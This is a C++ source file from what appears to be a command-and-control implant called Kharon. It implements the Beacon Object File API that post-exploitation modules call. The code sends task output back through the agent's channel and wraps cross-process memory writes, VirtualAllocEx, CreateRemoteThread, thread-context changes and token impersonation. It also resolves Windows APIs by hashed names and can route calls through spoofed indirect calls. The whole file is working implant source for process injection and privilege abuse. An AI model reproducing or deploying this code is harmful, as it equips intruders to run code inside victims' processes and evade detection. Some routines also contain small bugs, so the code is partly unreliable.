#include <Kharon.h>

auto DECLFN Coff::DataParse(
    DATAP* parser, 
    PCHAR  buffer, 
    INT    size
) -> VOID {
    G_KHARON

    if (parser == NULL) {
        return;
    }

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer   += 4;
}

auto DECLFN Coff::Output( 
    INT  type, 
    PCCH data, 
    INT  len
) -> VOID {
    G_KHARON

    VOID* MemRange  = __builtin_return_address( 0 );
    ULONG CommandID = 0;
    CHAR* UUID      = nullptr;

    CommandID = Self->Cf->GetCmdID( MemRange );
    UUID      = Self->Cf->GetTask( MemRange );
    
    Self->Pkg->SendOut( type, CommandID, (BYTE*)data, len );
}

auto DECLFN Coff::PrintfW(
    INT  type,
    PWCH fmt,
    ...
) -> VOID {
    G_KHARON

    va_list VaList;
    va_list VaListCopy;

    VOID*  MemRange = __builtin_return_address( 0 );
    CHAR*  UUID     = nullptr;
    int    MsgSize  = 0;
    int    written  = 0;
    WCHAR* MsgBuff  = nullptr;

    va_start( VaList, fmt );

    // Primeira cópia para calcular o tamanho
    va_copy( VaListCopy, VaList );
    MsgSize = Self->Msvcrt.k_vscwprintf( fmt, VaListCopy );
    va_end( VaListCopy );

    if ( MsgSize < 0 ) {
        KhDbg( "Printf: vscwprintf size probe failed" );
        goto _CLEANUP;
    }

    MsgBuff = ( WCHAR* )KhAlloc( ( MsgSize + 1 ) * sizeof( WCHAR ) );
    if ( !MsgBuff ) {
        KhDbg( "Printf: allocation failed" );
        goto _CLEANUP;
    }

    // Segunda cópia para formatar a string
    va_copy( VaListCopy, VaList );
    written = Self->Msvcrt.k_vswprintf( MsgBuff, MsgSize + 1, fmt, VaListCopy );
    va_end( VaListCopy );
    
    if ( written < 0 ) {
        KhDbg( "Printf: vswprintf output failed" ); 
        goto _CLEANUP;
    }
    
    MsgBuff[written] = L'\0';

    UUID = Self->Cf->GetTask( MemRange );
    KhDbg( "Printf: sending task %s -> \"%ls\" [%d bytes]", UUID, MsgBuff, written * sizeof(WCHAR) );
    Self->Pkg->SendMsgW( type, MsgBuff );

_CLEANUP:
    va_end( VaList );
    va_end( VaListCopy );
    
    if ( MsgBuff ) {
        KhFree( MsgBuff );
    }
}

auto DECLFN Coff::Printf(
    INT  type,
    PCCH fmt,
    ...
) -> VOID {
    G_KHARON

    va_list VaList;

    VOID* MemRange = __builtin_return_address( 0 );
    CHAR* UUID     = nullptr;
    int   MsgSize  = 0;
    int   written  = 0;
    CHAR* MsgBuff  = nullptr;

    va_start( VaList, fmt );
    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
    va_end( VaList );
    if ( MsgSize < 0 ) {
        KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
    }

    MsgBuff = ( CHAR* )KhAlloc( MsgSize + 1 );
    if ( !MsgBuff ) {
        KhDbg( "Printf: allocation failed" ); goto _KH_END;
    }

    va_start( VaList, fmt );
    written = Self->Msvcrt.vsnprintf( MsgBuff, MsgSize + 1, fmt, VaList );
    va_end( VaList );
    if ( written < 0 ) {
        KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
    }
    MsgBuff[written] = '\0'; 

    UUID = Self->Cf->GetTask( MemRange );
    KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
    Self->Pkg->SendMsgA( type, MsgBuff );

_KH_END:
    if ( MsgBuff ) KhFree( MsgBuff );
}

auto DECLFN Coff::DataExtract(
    DATAP* parser, 
    PINT   size
) -> PCHAR {
    G_KHARON
    return (PCHAR)Self->Psr->Bytes( (PPARSER)parser, (ULONG*)size );
}

auto DECLFN Coff::DataInt(
    DATAP* parser
)-> INT {
    G_KHARON
    return Self->Psr->Int32( (PPARSER)parser );
}

auto DECLFN Coff::DataShort(
    DATAP* parser
) -> SHORT {
    G_KHARON
    return Self->Psr->Int16( (PPARSER)parser );
}

auto DECLFN Coff::DataLength(
    DATAP* parser
) -> INT32 {
    return parser->length;
}

auto DECLFN Coff::FmtAlloc(
    FMTP*  Fmt,
    INT32  Maxsz
) -> VOID {
    G_KHARON

    if ( !Fmt ) return;

    Fmt->original = (CHAR*)KhAlloc( Maxsz );
    Fmt->buffer   = Fmt->original;
    Fmt->length   = 0;
    Fmt->size     = Maxsz;
}

auto DECLFN Coff::FmtReset(
    FMTP* Fmt
) -> VOID {
    Mem::Zero( (UPTR)Fmt->original, Fmt->size );
    Fmt->buffer = Fmt->original;
    Fmt->length = Fmt->size;
}

auto DECLFN Coff::FmtAppend(
    FMTP* Fmt,
    CHAR* Data,
    INT32 Len
) -> VOID {
    Mem::Copy( Fmt->buffer, Data, Len );
    Fmt->buffer += Len;
    Fmt->length += Len;
}

auto DECLFN Coff::FmtPrintfW(
    FMTP*  Fmt,
    WCHAR* Data,
    ...
) -> VOID {
    G_KHARON

    va_list Args;
    va_start( Args, Data );

    size_t avail   = Fmt->size - Fmt->length - 1;
    int    written = Self->Msvcrt.k_vswprintf( (WCHAR*)Fmt->buffer, avail, Data, Args );

    va_end( Args );
    if ( written < 0 ) {
        KhDbg( "FmtPrintf: vswnprint error" );
        return;
    }

    Fmt->buffer += written * sizeof(WCHAR);
    Fmt->length += written;
}

auto DECLFN Coff::FmtPrintf(
    FMTP* Fmt,
    CHAR* Data,
    ...
) -> VOID {
    G_KHARON

    va_list Args;
    va_start( Args, Data );

    size_t avail = Fmt->size - Fmt->length - 1;
    int written = Self->Msvcrt.vsnprintf( Fmt->buffer, avail, Data, Args );

    va_end( Args );
    if ( written < 0 ) {
        KhDbg( "FmtPrintf: vsnprintf error" );
        return;
    }

    Fmt->buffer += written;
    Fmt->length += written;
}

auto DECLFN Coff::FmtInt(
    FMTP* Fmt,
    INT32 Val
) -> VOID {
    if ( Fmt->length + 4 > Fmt->size ) return;

    Mem::Copy( Fmt->buffer, &Val, 4 );
    Fmt->buffer += 4;
    Fmt->length += 4;
    return;
}

auto DECLFN Coff::FmtToString(
    FMTP* fmt,
    PINT  size
) -> PCHAR {
    G_KHARON

    if ( !fmt || !fmt->original ) {
        if ( size ) *size = 0;
        return nullptr;
    }

    if ( fmt->length < 0 ) {
        KhDbg( "FmtToString: negative length %d, resetting to 0", fmt->length);
        fmt->length = 0;
    }

    if ( (UINT32)fmt->length >= fmt->size ) {
        UINT32 newSize = max( (UINT32)fmt->length + 1, fmt->size * 2 );
        CHAR*  Newbuf  = ( CHAR* )KhAlloc( newSize );
        if ( !Newbuf ) {
            if ( size ) *size = 0;
            return nullptr;
        }
        Mem::Copy( Newbuf, fmt->original, fmt->length );
        KhFree( fmt->original );
        fmt->original = Newbuf;
        fmt->size     = newSize;
    }

    fmt->original[fmt->length] = '\0';

    if ( size ) {
        *size = fmt->length;
    }

    KhDbg( "FmtToString: length=%d, buffer=\"%s\"", fmt->length, fmt->original );
    return fmt->original;
}

auto DECLFN Coff::IsAdmin( VOID ) -> BOOL {
    G_KHARON

    return Self->Session.Elevated;
}

auto DECLFN Coff::GetSpawn(
    BOOL  x86, 
    CHAR* buffer, 
    INT32 length
)-> VOID {
    G_KHARON

    if ( ! buffer || length <= 0 || x86 ) return;

    WCHAR* wspawnto = Self->Config.Postex.Spawnto;

    SIZE_T wspawnLen = Str::LengthW( wspawnto );
    SIZE_T cspawnLen = ( wspawnLen / 2 );

    CHAR* cspawnto = (CHAR*)KhAlloc( cspawnLen );
    
    if ( cspawnLen >= (SIZE_T)length ) {
        cspawnLen = length - 1;
    }

    Str::WCharToChar( cspawnto, wspawnto, cspawnLen + 1 );

    Mem::Copy( buffer, cspawnto, cspawnLen );
    buffer[cspawnLen] = '\0';  

    KhFree( cspawnto );
}

auto DECLFN Coff::FmtFree(
    FMTP* Fmt
)-> VOID {
    G_KHARON

    if ( !Fmt ) return;

    if ( Fmt->original ) {
        KhFree( Fmt->original );
        Fmt->original = nullptr;
    }
    
    Fmt->buffer = nullptr;
    Fmt->length = Fmt->size = 0;
}

auto DECLFN Coff::OpenProcess(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD processId
) -> HANDLE {
    G_KHARON
    return Self->Ps->Open( desiredAccess, inheritHandle, processId );
}

auto DECLFN Coff::WriteProcessMemory(
    HANDLE hProcess, 
    PVOID  BaseAddress, 
    PVOID  Buffer, 
    SIZE_T Size,  
    SIZE_T *Written
)->BOOL {
    G_KHARON
    return Self->Mm->Write( BaseAddress, (BYTE*)Buffer, Size, Written, hProcess );
}

auto DECLFN Coff::CreateProcessW(
    _In_  WCHAR*                Application,
    _In_  WCHAR*                Command,
    _In_  LPSECURITY_ATTRIBUTES PsAttributes,
    _In_  LPSECURITY_ATTRIBUTES ThreadAttributes,
    _In_  BOOL                  Inherit,
    _In_  ULONG                 Flags,
    _In_  PVOID                 Env,
    _In_  WCHAR*                CurrentDir,
    _In_  STARTUPINFOW*         StartupInfo,
    _Out_ PROCESS_INFORMATION* PsInfo
) -> BOOL {
    G_KHARON

    return Self->Ps->Create( Application, Command, Flags, PsAttributes, ThreadAttributes, Inherit, Env, CurrentDir, StartupInfo, PsInfo );
}

auto DECLFN Coff::CreateThread(
    LPSECURITY_ATTRIBUTES  Attributes,
    SIZE_T                 StackSize,
    LPTHREAD_START_ROUTINE Start,
    PVOID                  Parameter,
    ULONG                  Flags
) -> HANDLE {
    G_KHARON
    
    return Self->Td->Create( NtCurrentProcess(), (PVOID)Start, Parameter, StackSize, Flags, nullptr, Attributes);
}

auto DECLFN Coff::PkgInt8(
    _In_ BYTE Data
) -> VOID {
    G_KHARON

    return Self->Pkg->Byte( Self->Pkg->Shared, Data );
};

auto DECLFN Coff::PkgInt16(
    _In_ INT16 Data
) -> VOID {
    G_KHARON

    return Self->Pkg->Int16( Self->Pkg->Shared, Data );
};

auto DECLFN Coff::PkgInt32(
    INT32    Data
) -> VOID {
    G_KHARON

    return Self->Pkg->Int32( Self->Pkg->Shared, Data );
}

auto DECLFN Coff::PkgInt64(
    INT32    Data
) -> VOID {
    G_KHARON

    return Self->Pkg->Int64( Self->Pkg->Shared, Data );
}

auto DECLFN Coff::PkgBytes(
    PBYTE    Buffer,
    ULONG    Length
) -> VOID {
    G_KHARON

    return Self->Pkg->Bytes( Self->Pkg->Shared, Buffer, Length );
}

auto DECLFN Coff::CreateRemoteThread(
    HANDLE Handle, LPSECURITY_ATTRIBUTES Attributes, 
    SIZE_T                 StackSize, 
    LPTHREAD_START_ROUTINE Start, 
    LPVOID                 Parameter, 
    DWORD                  Flags, 
    LPDWORD                ThreadId
) -> HANDLE {
    G_KHARON

    return Self->Td->Create( Handle, (PVOID)Start, Parameter, StackSize, Flags, ThreadId, Attributes );
}

auto DECLFN Coff::ReadProcessMemory(
    HANDLE hProcess, 
    PVOID  BaseAddress, 
    PVOID  Buffer,  
    SIZE_T Size,  
    SIZE_T *Read
)->BOOL {
    G_KHARON
    return Self->Mm->Read( BaseAddress, (BYTE*)Buffer, Size, Read, hProcess );
}

auto DECLFN Coff::VirtualAlloc(
    PVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect );
}

auto DECLFN Coff::VirtualAllocEx(
    HANDLE Handle,
    PVOID  Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
}

auto DECLFN Coff::VirtualProtect(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON
    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
}

auto DECLFN Coff::VirtualProtectEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON
    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect, Handle );
}

auto DECLFN Coff::OpenThread(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD threadId
) -> HANDLE {
    G_KHARON
    return Self->Td->Open( desiredAccess, inheritHandle, threadId );
}

auto DECLFN Coff::LoadLibraryA(
    CHAR* LibraryName
) -> HMODULE {
    G_KHARON
    return (HMODULE)Self->Lib->Load( LibraryName );
}

auto DECLFN Coff::LoadLibraryW(
    WCHAR* LibraryName
) -> HMODULE {
    G_KHARON

    if (LibraryName == nullptr)
        return nullptr;

    CHAR LibA[MAX_PATH] = { 0 };
    Str::WCharToChar( LibA, LibraryName, MAX_PATH );

    return (HMODULE)Self->Lib->Load( LibA );
}

auto DECLFN Coff::CLRCreateInstance(
    REFCLSID clsid, REFIID riid, LPVOID* ppInterface
) -> HRESULT {
    G_KHARON

    UPTR Mscoree = 0;
    HRESULT (*CLRCreateInstance)(CLSID, REFIID, PVOID*);

    if ( ! ( Mscoree = LdrLoad::Module( Hsh::Str<char>("mscoree.dll") ) ) ) {
        Mscoree = Self->Lib->Load( "mscoree.dll" );
    }

    CLRCreateInstance = (decltype(CLRCreateInstance))LdrLoad::_Api( Mscoree, Hsh::Str<char>( "CLRCreateInstance" ) );

    return CLRCreateInstance(
        clsid,
        riid,
        ppInterface
    );
}

auto DECLFN Coff::SetThreadContext(
    HANDLE   Handle,
    CONTEXT* Ctx
) -> BOOL {
    G_KHARON
    return Self->Td->SetCtx( Handle, Ctx );
}

auto DECLFN Coff::GetThreadContext(
    HANDLE   Handle,
    CONTEXT* Ctx
) -> BOOL {
    G_KHARON
    return Self->Td->GetCtx( Handle, Ctx );
}

auto DECLFN Coff::CoInitialize(
    LPVOID pvReserved
) -> HRESULT {
    G_KHARON

    HRESULT(*khCoInitialize)(PVOID) = (decltype(khCoInitialize))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitialize") );

    if ( Self->Config.Syscall ) {
        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitialize, 0, (UPTR)pvReserved );
    }

    return khCoInitialize( pvReserved );
}

auto DECLFN Coff::CoInitializeEx(
    LPVOID pvReserved,
    DWORD  dwCoInit
) -> HRESULT {
    G_KHARON

    HRESULT(*khCoInitializeEx)(PVOID, DWORD) = (decltype(khCoInitializeEx))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitializeEx") );

    if ( Self->Config.Syscall ) {
        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
    }

    return khCoInitializeEx( pvReserved, dwCoInit );
}

auto Coff::UseToken(
    HANDLE token
) -> BOOL {
    G_KHARON

    return Self->Tkn->Use( token );
}

auto Coff::RevertToken(
    VOID
) -> VOID {
    G_KHARON

    Self->Tkn->Rev2Self();
}

auto Coff::RmValue(
    PCCH key
) -> BOOL {
    G_KHARON

    if ( ! Self->Cf->UserData ) return FALSE;

    VALUE_DICT* Prev    = nullptr;
    VALUE_DICT* Current = Self->Cf->UserData;

    while ( Current ) {
        if ( Str::CompareA( Current->Key, key ) == 0) {
            if (!Prev) {
                Self->Cf->UserData = Current->Next;
            } else {
                Prev->Next = Current->Next;
            }

            KhFree( Current->Key );
            KhFree( Current );
            
            return TRUE;
        }

        Prev    = Current;
        Current = Current->Next;
    }

    return FALSE;
}

auto Coff::AddValue(
    PCCH  key, 
    PVOID ptr
) -> BOOL {
    G_KHARON

    if ( !key || Self->Cf->GetValue( key ) ) return FALSE;

    VALUE_DICT* NewData = (VALUE_DICT*)KhAlloc( sizeof( VALUE_DICT ) );
    if ( ! NewData ) return FALSE;
    
    size_t keyLen = Str::LengthA( key );
    NewData->Key  = (CHAR*)KhAlloc( keyLen + 1 );
    if ( ! NewData->Key) {
        KhFree(NewData);
        return FALSE;
    }

    Mem::Copy( NewData->Key, (PVOID)key, keyLen );
    NewData->Key[keyLen] = '\0';
    NewData->Ptr = ptr;

    if ( ! Self->Cf->UserData ) {
        Self->Cf->UserData = NewData;
    } else {
        VALUE_DICT* Tail = Self->Cf->UserData;
        while ( Tail->Next ) {
            Tail = Tail->Next;
        }
        Tail->Next = NewData;
    }

    return TRUE;
}

auto Coff::GetValue(
    PCCH key
) -> PVOID {
    G_KHARON

    if ( ! key || ! Self->Cf->UserData ) return nullptr;

    VALUE_DICT* Current = Self->Cf->UserData;
    while ( Current ) {
        if ( Current->Key && Str::CompareA( Current->Key, key ) == 0 ) {
            return Current->Ptr;
        }
        Current = Current->Next;
    }
    
    return nullptr;
}

auto Coff::Information( BEACON_INFO* info ) -> BOOL {
    G_KHARON

    if ( ! info ) return FALSE;

    info->BeaconPtr    = (PBYTE)Self->Session.Base.Start;
    info->BeaconLength = Self->Session.Base.Length;
    
    info->Session.AgentId       = Self->Session.AgentID;
    info->Session.CommandLine   = Self->Session.CommandLine;
    info->Session.ImagePath     = Self->Session.ImagePath;
    info->Session.Elevated      = Self->Session.Elevated;
    info->Session.ProcessId     = Self->Session.ProcessID;

    info->HeapRecords.EntryCount = Self->Hp->Count;
    info->HeapRecords.NodeHead   = Self->Hp->Node;

    info->Config = &Self->Config;

    return TRUE;
}